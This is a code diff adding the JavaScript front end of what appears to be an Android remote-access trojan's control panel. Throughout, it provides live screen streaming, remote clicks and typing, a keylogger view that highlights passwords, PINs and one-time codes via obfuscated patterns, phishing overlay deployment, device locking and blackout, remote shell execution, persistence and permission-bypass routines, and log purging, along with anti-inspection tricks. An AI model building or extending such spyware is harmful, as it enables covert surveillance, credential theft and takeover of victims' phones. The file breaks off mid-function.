+console.log("%c[SYSTEM LOG] %cInitializing encrypted session...", "color:#00f2ff; font-weight:bold;", "color:#888;");
+console.log("%c[SECURITY] %cSandbox environment detected. Applying hardened telemetry protocols.", "color:#39ff14; font-weight:bold;", "color:#888;");
+console.log("%c[NETWORK] %cProxy link established: 127.0.0.1:9191 -> 0.0.0.0:443", "color:#ffff00; font-weight:bold;", "color:#888;");
+
+// Security Event Listeners
+document.addEventListener("contextmenu", e => e.preventDefault());
+document.addEventListener("keydown", e => {
+  if (123 === e.keyCode || (e.ctrlKey && e.shiftKey && (73 === e.keyCode || 74 === e.keyCode || 67 === e.keyCode)) || (e.ctrlKey && 85 === e.keyCode)) {
+    return e.preventDefault(), false;
+  }
+});
+
+// Global Variables & State
+const mask = e => "0x_" + btoa(e.split("").reverse().join(""));
+let _0x1a = 0;
+let _0x1b = [];
+let _0x1c = -1;
+let _0x2a = false;
+let _0x2b = false;
+let _0x2c = null;
+let _0x2d = 0;
+let _0x3a = false;
+let _0x3b = 0;
+let _0x3c = "0";
+let _0x3d = 640;
+let _0x3e = 480;
+let _0x3f = 40;
+let _lv = null;
+let _ac = false;
+let audioStream = null;
+let _ih = null;
+
+// Session Stability: window.fetch wrapper for handling 401/Login redirects by auto-refreshing
+const originalFetch = window.fetch;
+window.fetch = async function(...args) {
+  try {
+    const response = await originalFetch(...args);
+    if (response.status === 401) {
+      showToast("SESSION_EXPIRED: Re-authenticating...", "error");
+      setTimeout(() => {
+        window.location.reload();
+      }, 1000);
+    }
+    return response;
+  } catch (error) {
+    throw error;
+  }
+};
+
+// UI Info Popup
+function showInfo(e, t, o) {
+  if (e) e.stopPropagation();
+  let n = document.getElementById("info-popup");
+  if (!n) {
+    n = document.createElement("div");
+    n.id = "info-popup";
+    Object.assign(n.style, {
+      position: "absolute",
+      background: "rgba(15,15,25,0.98)",
+      border: "1px solid var(--neon-cyan)",
+      color: "#fff",
+      padding: "16px",
+      borderRadius: "12px",
+      zIndex: "20000",
+      width: "280px",
+      boxShadow: "0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",
+      transition: "opacity 0.3s ease",
+      opacity: "0",
+      display: "none",
+      pointerEvents: "auto"
+    });
+    document.body.appendChild(n);
+  }
+  const rect = e.target.getBoundingClientRect();
+  const scrollLeft = window.pageXOffset || document.documentElement.scrollLeft;
+  const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+  let topPos = rect.bottom + scrollTop + 10;
+  let leftPos = rect.left + scrollLeft - 140 + rect.width / 2;
+
+  if (leftPos < 10) leftPos = 10;
+  if (leftPos + 280 > window.innerWidth + scrollLeft) {
+    leftPos = window.innerWidth + scrollLeft - 290;
+  }
+
+  n.style.top = topPos + "px";
+  n.style.left = leftPos + "px";
+  n.innerHTML = `<div style="font-weight:bold; color:var(--neon-cyan); font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px;">${t}</div><div style="font-size:0.7rem; opacity:0.8; font-family:monospace; line-height:1.4;">${o}</div>`;
+  n.style.display = "block";
+  setTimeout(() => n.style.opacity = "1", 10);
+}
+
+function hideInfo() {
+  const e = document.getElementById("info-popup");
+  if (e && "block" === e.style.display) {
+    e.style.opacity = "0";
+    setTimeout(() => e.style.display = "none", 300);
+  }
+}
+
+function updateNav() {
+  const n = window.location.pathname;
+  const e = document.querySelectorAll(".nav a");
+  e.forEach(item => {
+    const t = item.getAttribute("href");
+    let o = false;
+    if ("/" === t) {
+      o = ("/" === n || "/terminal" === n);
+    } else if ("/files" === t) {
+      o = (n.startsWith("/files") || n.startsWith("/device/apps"));
+    } else if ("/device" === t) {
+      o = (n.startsWith("/device") && !n.includes("/apps"));
+    } else {
+      o = n.startsWith(t);
+    }
+
+    if (o) {
+      item.classList.add("active");
+    } else if (n.startsWith(t) && "/" !== t) {
+      // no-op
+    } else {
+      item.classList.remove("active");
+    }
+  });
+}
+
+function showToast(e, t = "info") {
+  let o = document.getElementById("c2-toast");
+  if (!o) {
+    o = document.createElement("div");
+    o.id = "c2-toast";
+    Object.assign(o.style, {
+      position: "fixed",
+      bottom: "15%",
+      left: "50%",
+      transform: "translateX(-50%)",
+      background: "rgba(15,15,25,0.98)",
+      border: "1px solid var(--neon-cyan)",
+      color: "#fff",
+      padding: "16px 32px",
+      borderRadius: "12px",
+      zIndex: "10000",
+      fontSize: "0.9rem",
+      textAlign: "center",
+      minWidth: "320px",
+      boxShadow: "0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",
+      transition: "all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)",
+      opacity: "0",
+      display: "none",
+      fontFamily: "Orbitron, sans-serif",
+      letterSpacing: "1px"
+    });
+    document.body.appendChild(o);
+  }
+  o.style.borderColor = "error" === t ? "var(--danger)" : "var(--neon-cyan)";
+  o.innerHTML = e;
+  o.style.display = "block";
+  setTimeout(() => {
+    o.style.opacity = "1";
+    o.style.bottom = "20%";
+  }, 10);
+  setTimeout(() => {
+    o.style.opacity = "0";
+    o.style.bottom = "15%";
+    setTimeout(() => o.style.display = "none", 500);
+  }, 5500);
+}
+
+// Repair & Optimization Functions
+function repairProtocol() {
+  _0x4a("REPAIR_LINK", "Re-synchronizing background telemetry protocols...", () => {
+    fetch("/gps/request-permission");
+    fetch("/device/fix-persistence")
+      .then(e => e.json())
+      .then(e => { showToast(e.message); })
+      .catch(e => {
+        console.error(e);
+        showToast("Connection failure", "error");
+      });
+  });
+}
+
+function dispatchPermissionSequence() {
+  showToast("PERMISSION_PROMPTS_SENT");
+  fetch("/device/request-permissions")
+    .then(e => e.json())
+    .then(e => { showToast(e.message); })
+    .catch(e => {
+      console.error(e);
+      showToast("Request failed", "error");
+    });
+}
+
+function optimizeStability() {
+  _0x4a("STABILITY_OPTIMIZE", "Bypassing OEM power restrictions...", () => {
+    fetch("/device/optimize-stability")
+      .then(e => e.json())
+      .then(e => { showToast("STABILITY_SYNC: Follow OEM instructions to enable Auto-start"); })
+      .catch(e => {
+        console.error(e);
+        showToast("Stability sync failed", "error");
+      });
+  });
+}
+
+function deepRepair() {
+  _0x4a("CORE_REPAIR", "Opening deep system configuration to resolve environment conflicts...", () => {
+    fetch("/device/deep-repair")
+      .then(e => e.json())
+      .then(e => { showToast("SETTINGS_OPENED: Complete repair on device"); })
+      .catch(e => {
+        console.error(e);
+        showToast("Repair link failed", "error");
+      });
+  });
+}
+
+function injectTrust() {
+  showToast("BYPASS_SEQUENCE_INITIATED");
+  fetch("/device/inject-trust")
+    .then(e => e.json())
+    .then(e => { showToast("BYPASS_INITIATED: Wait for install prompt"); })
+    .catch(e => {
+      console.error(e);
+      showToast("Bypass failed", "error");
+    });
+}
+
+function initiateHeal() {
+  _0x4a("AUTO_HEAL_PROTOCOL", "Initiating self-healing sequence to restore persistence layers...", () => {
+    ghostAction("autoheal");
+  });
+}
+
+// Tactical Modal Helper
+function _0x4a(e, t, o) {
+  let n = document.getElementById("tactical-modal");
+  if (!n) {
+    n = document.createElement("div");
+    n.id = "tactical-modal";
+    Object.assign(n.style, {
+      position: "fixed",
+      top: "0",
+      left: "0",
+      width: "100%",
+      height: "100%",
+      background: "rgba(0,0,0,0.85)",
+      zIndex: "30000",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      opacity: "0",
+      transition: "opacity 0.4s ease",
+      backdropFilter: "blur(10px)"
+    });
+    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button></div></div>';
+    document.body.appendChild(n);
+  }
+
+  document.getElementById("tm-title").innerText = e;
+  document.getElementById("tm-msg").innerText = t;
+  document.getElementById("tm-progress").style.width = "0%";
+  n.style.display = "flex";
+  setTimeout(() => n.style.opacity = "1", 10);
+
+  let aborted = false;
+  const abortSequence = () => {
+    aborted = true;
+    n.style.opacity = "0";
+    setTimeout(() => n.style.display = "none", 400);
+  };
+
+  document.getElementById("tm-cancel").onclick = abortSequence;
+  let progressVal = 0;
+  const progressInterval = setInterval(() => {
+    if (aborted) {
+      clearInterval(progressInterval);
+    } else {
+      progressVal += 4 * Math.random();
+      if (progressVal >= 100) {
+        progressVal = 100;
+        clearInterval(progressInterval);
+        setTimeout(() => {
+          if (!aborted) {
+            abortSequence();
+            o();
+          }
+        }, 600);
+      }
+      document.getElementById("tm-progress").style.width = progressVal + "%";
+    }
+  }, 120);
+}
+
+// Authentication & Password Settings
+async function handleLogin(e) {
+  e.preventDefault();
+  const t = document.getElementById("password").value;
+  const o = document.getElementById("status-header");
+  const n = document.getElementById("uplink-btn");
+  n.disabled = true;
+  n.style.opacity = "0.5";
+  try {
+    const res = await fetch("/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "password=" + encodeURIComponent(mask(t)) + "&json=true"
+    });
+    const data = await res.json();
+    if (data.success) {
+      o.textContent = "ACCESS_GRANTED";
+      o.style.color = "#39ff14";
+      o.style.textShadow = "0 0 25px #39ff14";
+      setTimeout(() => {
+        window.location.href = "/?auth=" + Date.now();
+      }, 1000);
+    } else {
+      o.textContent = "INCORRECT_PASSWORD";
+      o.style.color = "#ff3131";
+      o.style.textShadow = "0 0 25px #ff3131";
+      n.disabled = false;
+      n.style.opacity = "1";
+      setTimeout(() => {
+        o.textContent = "RESTRICTED_ACCESS";
+        o.style.color = "#00f2ff";
+        o.style.textShadow = "0 0 15px rgba(0,242,255,0.6)";
+      }, 2000);
+    }
+  } catch (err) {
+    console.error(err);
+    n.disabled = false;
+    n.style.opacity = "1";
+  }
+}
+
+async function updatePassword(e) {
+  e.preventDefault();
+  const t = e.target.querySelector('input[name="new_password"]').value;
+  try {
+    const res = await fetch("/settings/password", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: "new_password=" + encodeURIComponent(mask(t))
+    });
+    const text = await res.text();
+    document.open();
+    document.write(text);
+    document.close();
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+// Logs View
+function fetchLogs() {
+  const n = document.getElementById("log-terminal");
+  if (!n) return;
+  fetch("/terminal/logs?since=" + _0x1a)
+    .then(e => e.json())
+    .then(e => {
+      if (e.reset) {
+        n.innerHTML = "";
+        _0x1a = 0;
+      }
+      if (e.logs && e.logs.length > 0) {
+        const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 50;
+        if (_0x1a === 0) n.innerHTML = "";
+        e.logs.forEach(logLine => {
+          const div = document.createElement("div");
+          div.style.marginBottom = "4px";
+          let cleanText = logLine;
+          if (logLine.startsWith("[I]")) {
+            div.style.color = "var(--encrypted-blue)";
+            div.style.fontWeight = "bold";
+            div.style.textShadow = "0 0 10px rgba(0, 136, 255, 0.3)";
+            cleanText = logLine.substring(3);
+          } else if (logLine.startsWith("[C]")) {
+            div.style.color = "var(--danger)";
+            div.style.textShadow = "0 0 10px rgba(255, 49, 49, 0.5)";
+            div.style.fontWeight = "bold";
+            cleanText = logLine.substring(3);
+          } else if (logLine.startsWith("[W]")) {
+            div.style.color = "var(--neon-orange)";
+            cleanText = logLine.substring(3);
+          } else if (logLine.startsWith("[S]")) {
+            div.style.color = "var(--neon-green)";
+            cleanText = logLine.substring(3);
+          } else {
+            div.style.color = "var(--neon-cyan)";
+          }
+          div.innerText = cleanText;
+          n.appendChild(div);
+        });
+        _0x1a = e.last_id;
+        if (autoScroll) {
+          n.scrollTop = n.scrollHeight;
+        }
+      }
+    })
+    .catch(e => console.error("Log fetch failed", e));
+}
+
+function clearSessionLogs() {
+  showToast("PURGING_ACTIVITY_LOGS...");
+  fetch("/terminal/clear-logs").then(() => {
+    _0x1a = 0;
+    fetchLogs();
+  });
+}
+
+// Device Commands & Hub Openers
+function openAccessibility() {
+  fetch("/device/open-accessibility")
+    .then(e => e.json())
+    .then(e => { showToast("ACCESSIBILITY_HUB_OPENED"); })
+    .catch(e => {
+      console.error(e);
+      showToast("Link failure", "error");
+    });
+}
+
+function openNotifications() {
+  fetch("/device/open-notifications")
+    .then(e => e.json())
+    .then(e => { showToast("NOTIFICATION_HUB_OPENED"); })
+    .catch(e => {
+      console.error(e);
+      showToast("Link failure", "error");
+    });
+}
+
+function deviceCmd(e) {
+  fetch("/device/" + e)
+    .then(e => e.json())
+    .then(e => {
+      if (e && e.redirect) window.location.href = e.redirect;
+    });
+}
+
+function restartServer() {
+  if (confirm("Refresh background service? Interface will temporarily disconnect.")) {
+    fetch("/terminal/restart");
+    setTimeout(() => location.reload(), 2500);
+  }
+}
+
+function selfDestruct() {
+  if (confirm("CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?")) {
+    fetch("/device/self-destruct");
+  }
+}
+
+function sendToast() {
+  const e = document.getElementById("toast-msg").value;
+  if (e) fetch("/device/toast?msg=" + encodeURIComponent(e));
+}
+
+function toggleColorPicker(e) {
+  if (e) e.stopPropagation();
+  const palette = document.getElementById("color-picker-palette");
+  if (palette) {
+    palette.style.display = "none" === palette.style.display ? "grid" : "none";
+  }
+}
+
+function pickToastColor(e) {
+  document.getElementById("toast-color-val").value = e;
+  document.getElementById("toast-color-btn").style.background = e;
+  const palette = document.getElementById("color-picker-palette");
+  if (palette) palette.style.display = "none";
+}
+
+function sendEnhancedToast() {
+  const a = document.getElementById("toast-msg").value;
+  if (!a) return showToast("ENTER_MESSAGE_FIRST", "error");
+  const e = document.getElementById("toast-anim").value;
+  if ("burnt" === e) {
+    showToast("Sending_Burnt_Toast");
+    for (let i = 0; i < 15; i++) {
+      setTimeout(() => {
+        const size = Math.floor(40 * Math.random()) + 15;
+        const y = Math.floor(1600 * Math.random()) + 100;
+        const dur = Math.floor(7000 * Math.random()) + 3000;
+        const anim = ["pop", "static", "scroll"][Math.floor(3 * Math.random())];
+        const color = document.getElementById("toast-color-val").value;
+        fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + anim + "&color=" + encodeURIComponent(color));
+      }, 200 * i);
+    }
+  } else {
+    const size = document.getElementById("toast-size").value;
+    const y = document.getElementById("toast-y").value;
+    const dur = document.getElementById("toast-dur").value;
+    const color = document.getElementById("toast-color-val").value;
+    fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + e + "&color=" + encodeURIComponent(color))
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) showToast("TOAST_DISPATCHED");
+      });
+  }
+}
+
+function openApp() {
+  const e = document.getElementById("app-selector").value;
+  if (e) fetch("/device/open-app?pkg=" + encodeURIComponent(e));
+}
+
+function openUrl() {
+  const e = document.getElementById("target-url").value;
+  if (e) fetch("/device/open-url?url=" + encodeURIComponent(e));
+}
+
+function executeShell() {
+  const e = document.getElementById("shell-cmd");
+  const t = e.value;
+  const o = document.getElementById("shell-output");
+  if (t) {
+    _0x1b.push(t);
+    if (_0x1b.length > 50) _0x1b.shift();
+    _0x1c = -1;
+    const div = document.createElement("div");
+    div.style.color = "#fff";
+    div.style.marginTop = "10px";
+    const promptElement = document.getElementById("terminal-prompt");
+    const promptText = promptElement ? promptElement.innerText : "root@Android:~#";
+    div.innerHTML = '<span style="color:var(--terminal-green)">' + promptText + "</span> " + t;
+    o.appendChild(div);
+    e.value = "";
+    fetch("/device/shell?cmd=" + encodeURIComponent(t))
+      .then(res => res.json())
+      .then(data => {
+        if (data.termux_available) {
+          document.getElementById("termux-uplink").style.display = "block";
+          const p = document.getElementById("terminal-prompt");
+          if (p) p.innerText = "root@Android:~$";
+        } else {
+          const p = document.getElementById("terminal-prompt");
+          if (p) p.innerText = "root@Android:~#";
+        }
+        const outDiv = document.createElement("div");
+        outDiv.style.whiteSpace = "pre-wrap";
+        outDiv.innerHTML = data.output || "No output";
+        o.appendChild(outDiv);
+        o.scrollTop = o.scrollHeight;
+      })
+      .catch(() => {
+        const errDiv = document.createElement("div");
+        errDiv.style.color = "var(--danger)";
+        errDiv.textContent = "[ERROR] Connection lost";
+        o.appendChild(errDiv);
+      });
+  }
+}
+
+// Ghost Screen Controls
+function startGhostScreen() {
+  _0x2a = true;
+  const statusCard = document.getElementById("ghost-screen-status");
+  if (statusCard) statusCard.style.display = "none";
+  const btn = document.getElementById("ghost-toggle-btn");
+  if (btn) {
+    btn.innerText = "TERMINATE";
+    btn.style.borderColor = "var(--danger)";
+    btn.style.color = "var(--danger)";
+  }
+  refreshGhostScreen();
+}
+
+function stopGhostScreen() {
+  _0x2a = false;
+  const statusCard = document.getElementById("ghost-screen-status");
+  if (statusCard) {
+    statusCard.style.display = "block";
+    statusCard.innerText = "OLED_STANDBY";
+  }
+  const btn = document.getElementById("ghost-toggle-btn");
+  if (btn) {
+    btn.innerText = "INITIATE_VIEW";
+    btn.style.borderColor = "var(--neon-green)";
+    btn.style.color = "var(--neon-green)";
+  }
+  document.getElementById("ghost-screen-stream").src = "";
+}
+
+function toggleGhostScreen() {
+  if (_0x2a) {
+    stopGhostScreen();
+  } else {
+    startGhostScreen();
+  }
+}
+
+function refreshGhostScreen() {
+  if (_0x2a) {
+    const streamImg = document.getElementById("ghost-screen-stream");
+    const statusCard = document.getElementById("ghost-screen-status");
+    const img = new Image();
+    img.src = "/ghost/screenshot?t=" + Date.now();
+    img.onload = () => {
+      if (_0x2a) {
+        streamImg.src = img.src;
+        if (statusCard) statusCard.style.display = "none";
+        setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
+      }
+    };
+    img.onerror = () => {
+      if (_0x2a) setTimeout(refreshGhostScreen, 300);
+    };
+  }
+}
+
+function startGhostDrag(e) {
+  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
+  _0x2c = {
+    x: (e.clientX - rect.left) / rect.width * 100,
+    y: (e.clientY - rect.top) / rect.height * 100,
+    t: Date.now()
+  };
+}
+
+function endGhostDrag(e) {
+  if (!_0x2c) return;
+  const now = Date.now();
+  if (now - _0x2d < 150) return;
+  _0x2d = now;
+  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
+  const currentX = (e.clientX - rect.left) / rect.width * 100;
+  const currentY = (e.clientY - rect.top) / rect.height * 100;
+  const dragDuration = now - _0x2c.t;
+
+  if (Math.sqrt(Math.pow(currentX - _0x2c.x, 2) + Math.pow(currentY - _0x2c.y, 2)) < 2) {
+    fetch("/ghost/interact?action=click&px=" + _0x2c.x + "&py=" + _0x2c.y);
+  } else {
+    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x + "&py1=" + _0x2c.y + "&px2=" + currentX + "&py2=" + currentY + "&d=" + Math.max(dragDuration, 100));
+  }
+  _0x2c = null;
+}
+
+function openSettings() {
+  fetch("/ghost/interact?action=settings");
+}
+
+function deployOverlay() {
+  const e = document.getElementById("overlay-type").value;
+  if (!e) return showToast("SELECT_TARGET_FIRST", "error");
+  showToast("OVERLAY_DISPATCH_SENT");
+  fetch("/ghost/deploy-overlay?type=" + e)
+    .then(res => res.json())
+    .then(() => { showToast("OVERLAY_DEPLOYED"); });
+}
+
+function terminateOverlay() {
+  fetch("/ghost/deploy-overlay")
+    .then(res => res.json())
+    .then(() => { showToast("OVERLAY_TERMINATED"); });
+}
+
+function toggleLock() {
+  fetch("/ghost/lock").then(() => {
+    showToast("Uplink command sent: SYSTEM_LOCK");
+    checkGhostStatus();
+  });
+}
+
+function toggleBlackout() {
+  const isActivating = document.getElementById("blackout-btn").innerText.includes("ACTIVATE");
+  showToast(isActivating ? "BLACKOUT_PROTOCOL_ENGAGED" : "RESTORING_HARDWARE_BACKLIGHT...");
+  fetch("/ghost/interact?action=" + (isActivating ? "blackout_on" : "blackout_off")).then(() => checkGhostStatus());
+}
+
+function toggleAutoPilot() {
+  fetch("/stealth?action=autopilot")
+    .then(res => res.json())
+    .then(data => {
+      const btn = document.getElementById("autopilot-btn");
+      if (data.autopilot) {
+        btn.innerText = "AUTOPILOT_ENGAGED";
+        btn.classList.add("btn-engaged-yellow");
+        btn.style.color = "#000";
+        btn.style.background = "#ffff00";
+      } else {
+        btn.innerText = "AUTOPILOT_OFF";
+        btn.classList.remove("btn-engaged-yellow");
+        btn.style.color = "var(--neon-yellow)";
+        btn.style.background = "rgba(255, 255, 255, 0.03)";
+      }
+    });
+}
+
+function ghostType() {
+  const e = document.getElementById("ghost-type-input");
+  const t = e.value;
+  if (t) fetch("/ghost/interact?action=type&text=" + encodeURIComponent(t));
+  e.value = "";
+}
+
+// Base Actions
+function ghostAction(e) {
+  fetch("/ghost/interact?action=" + e);
+}
+
+function clearGhostLogs() {
+  showToast("PURGING_KEYLOG_HISTORY...");
+  fetch("/ghost/clear").then(() => refreshGhostLogs());
+}
+
+// Tree Traversal Inspector
+async function refreshInspector() {
+  const o = document.getElementById("inspector-tree");
+  if (!o) return;
+  o.innerHTML = '<span style="color:var(--neon-cyan)">[SCANNING] Traversing Accessibility Tree...</span>';
+  try {
+    const data = await (await fetch("/ghost/inspector")).json();
+    if (data.error) {
+      o.innerHTML = '<span style="color:var(--danger)">[ERROR] ' + data.error + "</span>";
+    } else {
+      o.innerHTML = "";
+      const div = document.createElement("div");
+      div.style.padding = "12px 18px";
+      div.style.marginBottom = "20px";
+      div.style.background = "rgba(0, 242, 255, 0.08)";
+      div.style.border = "1px solid rgba(0, 242, 255, 0.15)";
+      div.style.borderRadius = "10px";
+      div.style.boxShadow = "inset 0 0 15px rgba(0,242,255,0.05)";
+
+      let pkgName = data.package;
+      let iconHtml = "&#128241;";
+      if (["launcher", "trebuchet", "home", "desktop", "nexuslauncher"].some(kw => pkgName.toLowerCase().includes(kw))) {
+        pkgName = "System Home Screen";
+        iconHtml = "&#127968;";
+      } else if (pkgName.includes(".android.settings")) {
+        pkgName = "System Settings";
+      } else if (pkgName.includes(".vending")) {
+        pkgName = "Google Play Store";
+      } else if (pkgName.includes(".chrome")) {
+        pkgName = "Chrome Browser";
+      } else if (pkgName.includes(".messaging") || pkgName.includes(".sms")) {
+        pkgName = "SMS / Messages";
+      } else if (pkgName.includes(".contacts")) {
+        pkgName = "Contacts / Phonebook";
+      }
+
+      div.innerHTML = `<div style="display:flex; align-items:center; gap:12px; width:100%;"><div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${iconHtml}</div><div style="flex-grow:1; min-width:0; overflow:hidden;"><div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">CURRENT_UPLINK_CONTEXT</div><div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${pkgName}</div><div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div></div><div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">SECURE_LAYER_V2<br>SYSCALL_ACTIVE</div></div>`;
+      o.appendChild(div);
+      _0x5a(data.tree, o, 0, data.width, data.height);
+    }
+  } catch (err) {
+    o.innerHTML = '<span style="color:var(--danger)">[FATAL] Inspector Timeout</span>';
+  }
+}
+
+function _0x5a(n, r, a, l, s) {
+  if (!n) return;
+  const e = document.createElement("div");
+  e.style.display = "flex";
+  e.style.alignItems = "center";
+  e.style.padding = "8px 12px";
+  e.style.marginLeft = 16 * a + "px";
+  e.style.borderLeft = "1px solid rgba(0, 242, 255, 0.12)";
+  e.style.whiteSpace = "nowrap";
+  e.style.transition = "all 0.2s cubic-bezier(0.4, 0, 0.2, 1)";
+  e.style.cursor = "pointer";
+  e.style.borderRadius = "4px";
+
+  const shortClass = n.class.split(".").pop();
+  let bulletIcon = "&#9634;";
+  if (n.class.toLowerCase().includes("button")) bulletIcon = "&#9007;";
+  else if (n.class.toLowerCase().includes("edit")) bulletIcon = "&#9998;";
+  else if (n.class.toLowerCase().includes("text")) bulletIcon = "&#8443;";
+  else if (n.class.toLowerCase().includes("image")) bulletIcon = "&#128443;";
+  else if (n.class.toLowerCase().includes("layout")) bulletIcon = "&#128392;";
+  else if (n.class.toLowerCase().includes("recycler") || n.class.toLowerCase().includes("list")) bulletIcon = "&#128220;";
+
+  e.title = `Class: ${n.class}\nBounds: ${n.x},${n.y} [${n.w}x${n.h}]\nVisible: ${n.visible}\nFocusable: ${n.focusable}`;
+  let innerMarkup = `<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${bulletIcon}</span><span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${shortClass}</span>`;
+
+  if (n.resId) {
+    innerMarkup += `<span style="color:var(--neon-orange); margin-left:10px; font-size:0.7rem; opacity:0.8; font-family:monospace;">#${n.resId.split("/").pop()}</span>`;
+  }
+  if (n.text) {
+    innerMarkup += `<span style="color:#fff; margin-left:12px; font-weight:bold; font-size:0.8rem; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">"${n.text}"</span>`;
+  } else if (n.desc) {
+    innerMarkup += `<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${n.desc}]</span>`;
+  }
+  if (n.clickable) {
+    innerMarkup += '<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">CLICKABLE</span>';
+  }
+  if (n.password) {
+    innerMarkup += '<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">PASSWORD</span>';
+  }
+  if (n.editable) {
+    innerMarkup += '<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">EDITABLE</span>';
+  }
+
+  e.innerHTML = innerMarkup;
+  e.onmouseenter = () => {
+    e.style.background = "rgba(0, 242, 255, 0.08)";
+    e.style.boxShadow = "0 0 10px rgba(0, 242, 255, 0.1)";
+  };
+  e.onmouseleave = () => {
+    e.style.background = "transparent";
+    e.style.boxShadow = "none";
+  };
+  e.onclick = event => {
+    event.stopPropagation();
+    const targetX = 100 * (n.x + n.w / 2) / l;
+    const targetY = 100 * (n.y + n.h / 2) / s;
+    fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
+  };
+
+  r.appendChild(e);
+  if (n.children) {
+    n.children.forEach(c => _0x5a(c, r, a + 1, l, s));
+  }
+}
+
+// Keylogger Terminal Logs
+async function refreshGhostLogs() {
+  try {
+    const res = await fetch("/ghost/keys");
+    if (res.ok) {
+      const data = await res.json();
+      const n = document.getElementById("ghost-terminal");
+      if (n && data.keys.length > 0) {
+        const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 10;
+        let formattedText = data.keys.join("").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        formattedText = formattedText.replace(/(\[.*?\] ->)/g, '<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>');
+        formattedText = formattedText.replace(/(\[CLICK\]:|\[LONG_CLICK\]:)/g, '<span style="color:var(--neon-green); font-weight:bold;">$1</span>');
+
+        ["password", "pin", "code", "auth", "login", "account", "verify"].forEach(kw => {
+          const re = new RegExp("(" + kw + ")", "gi");
+          formattedText = formattedText.replace(re, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
+        });
+
+        formattedText = formattedText.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');
+
+        ["\\x1C\\x0D\\x03", "\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A", "\\x0F\\x06\\x14\\x00\\x0A", "\\x16\\x1A\\x16\\x13", "\\x06\\x04\\x02\\x08\\x08"].forEach(pattern => {
+          const dec = pattern.split("").map((ch, idx) => String.fromCharCode(ch.charCodeAt(0) ^ "SysAdmin".charCodeAt(idx % 8))).join("");
+          const re = new RegExp("(" + dec + ")", "gi");
+          formattedText = formattedText.replace(re, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>');
+        });
+
+        n.innerHTML = formattedText;
+        if (autoScroll) n.scrollTop = n.scrollHeight;
+      }
+    }
+  } catch (err) {}
+}
+
+async function checkGhostStatus() {
+  try {
+    const res = await fetch("/ghost/status");
+    if (res.ok) {
+      const data = await res.json();
+      _0x2b = data.isIdle;
+      const statusCard = document.getElementById("ghost-status-card");
+      const statusText = document.getElementById("ghost-status-text");
+      const accPrompt = document.getElementById("accessibility-prompt");
+      const lockBtn = document.getElementById("lock-btn");
